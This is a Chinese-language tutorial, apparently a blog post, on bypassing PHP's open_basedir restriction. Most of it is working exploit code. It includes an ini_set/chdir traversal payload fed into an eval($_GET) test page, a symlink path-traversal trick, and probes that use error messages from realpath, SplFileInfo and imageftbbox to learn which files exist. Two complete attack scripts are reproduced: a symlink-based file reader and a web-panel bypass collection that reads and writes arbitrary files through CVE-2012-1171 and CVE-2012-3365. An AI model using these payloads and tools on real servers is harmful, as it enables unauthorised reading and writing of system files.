##  open_basedir()

open_basedir是php.ini的一个配置选项，可以让用户访问的区域限制在指定文件目录中。

**存在文件**

1. php.ini
2. .user.ini
3. .htaccess

这三个文件都是配置文件，可以实现open_basedir的功能。

**文件路径**

如果open_basedir=/var/www/html/web/:/tmp/:/proc/，那么通过web访问服务器的用户就无法获取服务器上除了/var/www/html/web/，/tmp/和/proc/这三个目录以外的文件。

注意：

1. 在open_basedir的文件路径中，使用`冒号:`作为分隔符。

2. 用open_basedir指定的**限制实际上是前缀，而不是目录名**，也就是说该路径下的文件都可以访问。

我这儿看到目录，又去看了下[linux的目录结构](https://www.runoob.com/linux/linux-system-contents.html)
**操作演示**

```php
<?php
print_r(ini_get('open_basedir').'<br>');
var_dump(file_get_contents("/etc/passwd"));
?>
```
限制了读取目录，读取不到`/etc/passwd`
![在这里插入图片描述](https://img-blog.csdnimg.cn/5ca7dfd29a5347459730f11d82913e06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
##  读取目录
###  利用DirectoryIterator类 + glob://协议
`DirectoryIterator类`是一个原生类，可以读取文件的目录
直接上代码
```php
<?php
	$dir=new DirectoryIterator('glob:///*');
	foreach($dir as $d){
    	echo $d->__toString().'</br>';
    }
?>
```
效果，成功读取到了根目录，对于`glob://协议`和`DirectoryIterator类`自行百度
![在这里插入图片描述](https://img-blog.csdnimg.cn/8424908c15634bfbbf3b5705deadce87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
###  利用FilesystemIterator类 + glob://协议
`FilesystemIterator类`也是一个原生类，跟`DirectoryIterator类`是一样的。
代码

```php
<?php
	print_r(ini_get("open_basedir")."</br>");
	$dir=new FilesystemIterator('glob:///www/wwwroot/test/*');
	foreach($dir as $d){
    	echo $d->__toString().'</br>';
    }
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c478e3970f254ce3a8c41c70589b98bf.png)
##  文件读取
###  shell命令执行
shell命令不受`open_basedir`的影响
代码

```php
<?php
	print_r(ini_get("open_basedir")."</br>");
	system("cat /etc/hosts");
	show_source(__FILE__);
?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/c2a2168f1b994297bbd4c854690380e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
但是一般情况下，system()等命令执行函数可能会被disable_functions给禁用掉，因此运用到的场景可能并不多。
###  利用ini_set()和chdir
我们先直接看怎么去利用
测试代码
```php
<?php
show_source(__FILE__);
echo 'open_basedir: '.ini_get('open_basedir').'</br>';
eval($_GET['c']);
echo '</br>';
echo 'open_basedir: '.ini_get('open_basedir');
?>
```
传参

```php
c=mkdir('flag');chdir('flag');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/hosts');
```
结果：
![在这里插入图片描述](https://img-blog.csdnimg.cn/d0970f4b4d974252a3c33c79ec5cacba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
可见，通过上面的payload，直接改变`open_basedir`的限制目录了。
再来一个例子
```php
<?php
	show_source(__FILE__);
	print_r(ini_get('open_basedir').'<br>');
	//修改open_basedir
	mkdir('test');
	chdir('test');
	ini_set('open_basedir','..');
	chdir('..');
	chdir('..');
	chdir('..');
	ini_set('open_basedir','/');
	
	echo file_get_contents('/etc/hosts');
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0de89b1084db49faa1d43b7d324d74a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
**原理**：
[从底层理解绕过open_basedir](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E6%80%BB%E7%BB%93)
[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720#toc-4)

若open_basedir限定到了当前目录，就需要新建子目录，进入设置其为..，若已经是open_basedir的子目录就不需要，因为限定到了当前目录再设置为..就会出错。之后每次引用路径就会触发open_basedir判别，而在解析open_basedir的时候会拼接上..，从而引发open_basedir自身向上跳一级，最后跳到了根目录，再将open_basedir设置到根目录即可。

至于底层的原理，等后面学php底层的时候再回来看看

### 利用symlink()
**符号连接**
>符号连接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。

**symlink函数**
```php
symlink建立符号链接。
symlink(string $target, string $link): bool
symlink() 对于已有的 target 建立一个名为 link 的符号连接。
target
连接的目标。
link
连接的名称。
返回值 
成功时返回 true， 或者在失败时返回 false。
```
直接上`Bypass`
```php
<?php
    show_source(__FILE__);
    
    mkdir("1");chdir("1");
    mkdir("2");chdir("2");
    mkdir("3");chdir("3");
    mkdir("4");chdir("4");
    
    chdir("..");chdir("..");chdir("..");chdir("..");
    
    symlink("1/2/3/4","test");
    symlink("test/../../../../etc/hosts","flag");
    unlink("test");
    mkdir("test");
    echo file_get_contents("flag");
?>

```
当前路径是/www/wwwroot/test/，新建目录数量=需要上跳次数+1

**原理**
symlink会生成了符号连接，我们需要访问`/etc/hosts`，那么就需要上调3个目录，加上当前的目录，就是4个目录，所以使用`mkdir`和`chdir`创建四个目录。然后生成软链接`symlink("1/2/3/4","test")`,然后再生成` symlink("test/../../../../etc/hosts","flag")`,之后就用`mkdir`将软链接换成文件夹`test`。
所以，最后访问的就是`/www/wwwroot/test/../../../../etc/hosts`，目录穿越，也就是`/etc/hosts`。

本方法的**注意点**:就是路径和新建目录的数量问题
## 查看文件是否存在
之前的是绕过`open_basedir`去读取目录和读取文件内容
下面是通过绕过`open_basedir`去判断该目录下的文件是否存在。
###   利用bindtextdomain()函数
**bindtextdomain函数**
>bindtextdomain()函数
>(PHP 4, PHP 5, PHP 7)
>bindtextdomain()函数用于绑定domain到某个目录的函数。
>函数定义如下：
>bindtextdomain ( string $domain , string $directory ) : string

**原理**
基于报错：bindtextdomain()函数的第二个参数\$directory是一个文件路径，它会在\$directory存在的时候返回\$directory，不存在则返回false。

测试代码
```php
<?php
show_source(__FILE__);
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$re1 = bindtextdomain('xxx', "/etc/passwd");
var_dump($re1);
echo "</br>";
$re2=bindtextdomain('xxx',"/etc/xxx");
var_dump($re2);
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e6e786725330472999cb40cf71b747dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
当路径存在时，返回路径，不存在就返回false，可以判断文件是否存在
###  利用SplFileInfo::getRealPath()类方法
先用SplFileInfo来读取文件内容

```php
<?php
show_source(__FILE__);
print_r(ini_get("open_basedir"));
$context = new SplFileObject('/etc/passwd');
echo $context;
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/afc1f2d9951946c28c21726945ef1be8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
表示存在`open_basedir`，不能读取。

SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。

测试代码：

```php
<?php
show_source(__File__);
echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';
$info1 = new SplFileInfo("/etc/passwd");
var_dump($info1->getRealPath());
$info2=new SplFileInfo("/etc/xxx");
var_dump($info2->getRealPath());
?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b7d6d3fef3b64b46b773635c5620ee97.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
但是如果我们完全不知道路径的情况下可能想到暴力猜解，时间花费极高。在Windows系统下可以利用<>来列出所需目录下的文件，有P神的POC如下:
环境：windows
```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
$basedir = 'D:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) { 
    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
    $re = $info->getRealPath();
    if ($re) {
        dump($re);
    }
}
function dump($s){
    echo $s . '<br/>';
    ob_flush();
    flush();
}
?>
```
爆出目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/3b84f02d68284d4f9990a084c82da4c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

注意：由于<><是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。
###  利用realpath()
realpath()函数和SplFileInfo::getRealPath()作用类似。可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。函数定义如下:
```php
realpath ( string $path ) : string
```

当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 

同样，对于这个函数，我们在Windows下仍然能够使用通配符<>来列目录，有P神的脚本如下:
环境测试：windows系统
```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```
就直接爆出了目录文件名
![在这里插入图片描述](https://img-blog.csdnimg.cn/ae66f040725843908ee0f62111fab004.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

realpath()和SplFileInfo::getRealPath()的区别：
>realpath()只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录
>而SplFileInfo::getRealPath()可以无视是否开启open_basedir进行列目录
>但是当没有open_basedir我们也不需要这些了。

###  利用imageftbbox()
GD库一般是PHP必备的扩展库之一，当中的imageftbbox()函数也可以起到像realpath()一样的列目录效果。
其思想也和上面的类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件`存在`，则php会抛出`“File(xxxxx) is not within the allowed path(s)”`错误。但当文件`不存在`的时候会抛出`“Invalid font filename”`错误。

环境：windows
POC:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    //$m = imagecreatefrompng("zip.png");
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
    imageftbbox(100, 100, $file, 'aaa');
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, 'Invalid font filename') === FALSE) {
        printf("%s<br/>", $file);
    }
}
?>
```
但是这个测试出来有点怪。该方法并不能把路径爆出来，这也是与realpath的最大不同之处。所以，我们只能一位一位地猜测。
##  脚本
**一个是p神的脚本**，就是利用symlink()函数来Bypass

```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/47a527fa01574fbbac6b999ad9280d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)
**还有一个是网上的脚本**
直接绕过open_basedir爆目录
只是页面更简化，操作起来更容易了。
原理：glob://协议来读取目录
```php
<?php
/*
PHP open_basedir bypass collection
Works with >= PHP5
By /fd, @filedescriptor(https://twitter.com/filedescriptor)
 */
 
// Assistant functions
function getRelativePath($from, $to) {
	// some compatibility fixes for Windows paths
	$from = rtrim($from, '\/') . '/';
	$from = str_replace('\\', '/', $from);
	$to = str_replace('\\', '/', $to);
 
	$from = explode('/', $from);
	$to = explode('/', $to);
	$relPath = $to;
 
	foreach ($from as $depth => $dir) {
		// find first non-matching dir
		if ($dir === $to[$depth]) {
			// ignore this directory
			array_shift($relPath);
		} else {
			// get number of remaining dirs to $from
			$remaining = count($from) - $depth;
			if ($remaining > 1) {
				// add traversals up to first matching dir
				$padLength = (count($relPath) + $remaining - 1) * -1;
				$relPath = array_pad($relPath, $padLength, '..');
				break;
			} else {
				$relPath[0] = './' . $relPath[0];
			}
		}
	}
	return implode('/', $relPath);
}
 
function fallback($classes) {
	foreach ($classes as $class) {
		$object = new $class;
		if ($object->isAvailable()) {
			return $object;
		}
	}
	return new NoExploit;
}
 
// Core classes
interface Exploitable {
	function isAvailable();
	function getDescription();
}
 
class NoExploit implements Exploitable {
	function isAvailable() {
		return true;
	}
	function getDescription() {
		return 'No exploit is available.';
	}
}
 
abstract class DirectoryLister implements Exploitable {
	var $currentPath;
 
	function isAvailable() {}
	function getDescription() {}
	function getFileList() {}
	function setCurrentPath($currentPath) {
		$this->currentPath = $currentPath;
	}
	function getCurrentPath() {
		return $this->currentPath;
	}
}
 
class GlobWrapperDirectoryLister extends DirectoryLister {
	function isAvailable() {
		return stripos(PHP_OS, 'win') === FALSE && in_array('glob', stream_get_wrappers());
	}
	function getDescription() {
		return 'Directory listing via glob pattern';
	}
	function getFileList() {
		$file_list = array();
		// normal files
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		// special files (starting with a dot(.))
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}.*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		sort($file_list);
		return $file_list;
	}
}
 
class RealpathBruteForceDirectoryLister extends DirectoryLister {
	var $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
	, $extension = array()
	, $charactersLength = 38
	, $maxlength = 3
	, $fileList = array();
 
	function isAvailable() {
		return ini_get('open_basedir') && function_exists('realpath');
	}
	function getDescription() {
		return 'Directory listing via brute force searching with realpath function.';
	}
	function setCharacters($characters) {
		$this->characters = $characters;
		$this->charactersLength = count($characters);
	}
	function setExtension($extension) {
		$this->extension = $extension;
	}
	function setMaxlength($maxlength) {
		$this->maxlength = $maxlength;
	}
	function getFileList() {
		set_time_limit(0);
		set_error_handler(array(__CLASS__, 'handler'));
		$number_set = array();
		while (count($number_set = $this->nextCombination($number_set, 0)) <= $this->maxlength) {
			$this->searchFile($number_set);
		}
		sort($this->fileList);
		return $this->fileList;
	}
	function nextCombination($number_set, $length) {
		if (!isset($number_set[$length])) {
			$number_set[$length] = 0;
			return $number_set;
		}
		if ($number_set[$length] + 1 === $this->charactersLength) {
			$number_set[$length] = 0;
			$number_set = $this->nextCombination($number_set, $length + 1);
		} else {
			$number_set[$length]++;
		}
		return $number_set;
	}
	function searchFile($number_set) {
		$file_name = 'a';
		foreach ($number_set as $key => $value) {
			$file_name[$key] = $this->characters[$value];
		}
		// normal files
		realpath($this->getCurrentPath() . $file_name);
		// files with preceeding dot
		realpath($this->getCurrentPath() . '.' . $file_name);
		// files with extension
		foreach ($this->extension as $extension) {
			realpath($this->getCurrentPath() . $file_name . $extension);
		}
	}
	function handler($errno, $errstr, $errfile, $errline) {
		$regexp = '/File\((.*)\) is not within/';
		preg_match($regexp, $errstr, $matches);
		if (isset($matches[1])) {
			$this->fileList[] = $matches[1];
		}
 
	}
}
 
abstract class FileWriter implements Exploitable {
	var $filePath;
 
	function isAvailable() {}
	function getDescription() {}
	function write($content) {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}
 
abstract class FileReader implements Exploitable {
	var $filePath;
 
	function isAvailable() {}
	function getDescription() {}
	function read() {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}
 
// Assistant class for DOMFileWriter & DOMFileReader
class StreamExploiter {
	var $mode, $filePath, $fileContent;
 
	function stream_close() {
		$doc = new DOMDocument;
		$doc->strictErrorChecking = false;
		switch ($this->mode) {
		case 'w':
			$doc->loadHTML($this->fileContent);
			$doc->removeChild($doc->firstChild);
			$doc->saveHTMLFile($this->filePath);
			break;
		default:
		case 'r':
			$doc->resolveExternals = true;
			$doc->substituteEntities = true;
			$doc->loadXML("<!DOCTYPE doc [<!ENTITY file SYSTEM \"file://{$this->filePath}\">]><doc>&file;</doc>", LIBXML_PARSEHUGE);
			echo $doc->documentElement->firstChild->nodeValue;
		}
	}
	function stream_open($path, $mode, $options, &$opened_path) {
		$this->filePath = substr($path, 10);
		$this->mode = $mode;
		return true;
	}
	public function stream_write($data) {
		$this->fileContent = $data;
		return strlen($data);
	}
}
 
class DOMFileWriter extends FileWriter {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.';
	}
	function write($content) {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'w');
		fwrite($_DOM_exploit_resource, $content);
	}
}
 
class DOMFileReader extends FileReader {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.';
	}
	function read() {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'r');
	}
}
 
class SqliteFileWriter extends FileWriter {
	function isAvailable() {
		return is_writable(getcwd())
			&& (extension_loaded('sqlite3') || extension_loaded('sqlite'))
			&& (version_compare(phpversion(), '5.3.15', '<=') || (version_compare(phpversion(), '5.4.5', '<=') && PHP_MINOR_VERSION == 4));
	}
	function getDescription() {
		return 'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted';
	}
	function write($content) {
		$sqlite_class = extension_loaded('sqlite3') ? 'sqlite3' : 'SQLiteDatabase';
		mkdir(':memory:');
		$payload_path = getRelativePath(getcwd() . '/:memory:', $this->getFilePath());
		$payload = str_replace('\'', '\'\'', $content);
		$database = new $sqlite_class(":memory:/{$payload_path}");
		$database->exec("CREATE TABLE foo (bar STRING)");
		$database->exec("INSERT INTO foo (bar) VALUES ('{$payload}')");
		$database->close();
		rmdir(':memory:');
	}
}
 
// End of Core
?>
<?php
$action = isset($_GET['action']) ? $_GET['action'] : '';
$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();
$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
$directorLister = fallback(array('GlobWrapperDirectoryLister', 'RealpathBruteForceDirectoryLister'));
$fileWriter = fallback(array('DOMFileWriter', 'SqliteFileWriter'));
$fileReader = fallback(array('DOMFileReader'));
$append = '';
?>
<style>
#panel {
  height: 200px;
  overflow: hidden;
}
#panel > pre {
  margin: 0;
  height: 200px;
}
</style>
<div id="panel">
<pre id="dl">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Directory Listing:</legend>Current Directory: <input name="cwd" size="100" value="<?php echo $cwd; ?>"><input type="submit" value="Go">
<?php if (get_class($directorLister) === 'RealpathBruteForceDirectoryLister'): ?>
<?php
$characters = isset($_GET['characters']) ? $_GET['characters'] : $directorLister->characters;
$maxlength = isset($_GET['maxlength']) ? $_GET['maxlength'] : $directorLister->maxlength;
$append = "&characters={$characters}&maxlength={$maxlength}";
 
$directorLister->setMaxlength($maxlength);
?>
Search Characters: <input name="characters" size="100" value="<?php echo $characters; ?>">
Maxlength of File: <input name="maxlength" size="1" value="<?php echo $maxlength; ?>">
<?php endif;?>
Description      : <strong><?php echo $directorLister->getDescription(); ?></strong>
</fieldset>
</form>
</pre>
<?php
$file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';
?>
<pre id="rf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Read File :</legend>File Path: <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Read">
Description: <strong><?php echo $fileReader->getDescription(); ?></strong><input type="hidden" name="action" value="rf">
</fieldset>
</form>
</pre>
<pre id="wf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Write File :</legend>File Path   : <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Write">
File Content: <textarea cols="70" name="content"></textarea>
Description : <strong><?php echo $fileWriter->getDescription(); ?></strong><input type="hidden" name="action" value="wf">
</fieldset>
</form>
</pre>
</div>
<a href="#dl">Directory Listing</a> | <a href="#rf">Read File</a> | <a href="#wf">Write File</a>
<hr>
<pre>
<?php if ($action === 'rf'): ?>
<plaintext>
<?php
$fileReader->setFilePath($file_path);
echo $fileReader->read();
?>
<?php elseif ($action === 'wf'): ?>
<?php
if (isset($_GET['content'])) {
	$fileWriter->setFilePath($file_path);
	$fileWriter->write($_GET['content']);
	echo 'The file should be written.';
} else {
	echo 'Something goes wrong.';
}
?>
<?php else: ?>
<ol>
<?php
$directorLister->setCurrentPath($cwd);
$file_list = $directorLister->getFileList();
$parent_path = dirname($cwd);
 
echo "<li><a href='?cwd={$parent_path}{$append}#dl'>Parent</a></li>";
if (count($file_list) > 0) {
	foreach ($file_list as $file) {
		echo "<li><a href='?cwd={$cwd}{$file}{$append}#dl'>{$file}</a></li>";
	}
} else {
	echo 'No files found. The path is probably not a directory.';
}
?>
</ol>
<?php endif;?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3e076f2d334c453dbb67a1db4b61df7c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

##  参考文章
```
https://blog.csdn.net/Xxy605/article/details/120221577
https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#0x08-%E5%88%A9%E7%94%A8realpath-%E5%87%BD%E6%95%B0Bypass
https://www.leavesongs.com/other/bypass-open-basedir-readfile.html
https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html
```
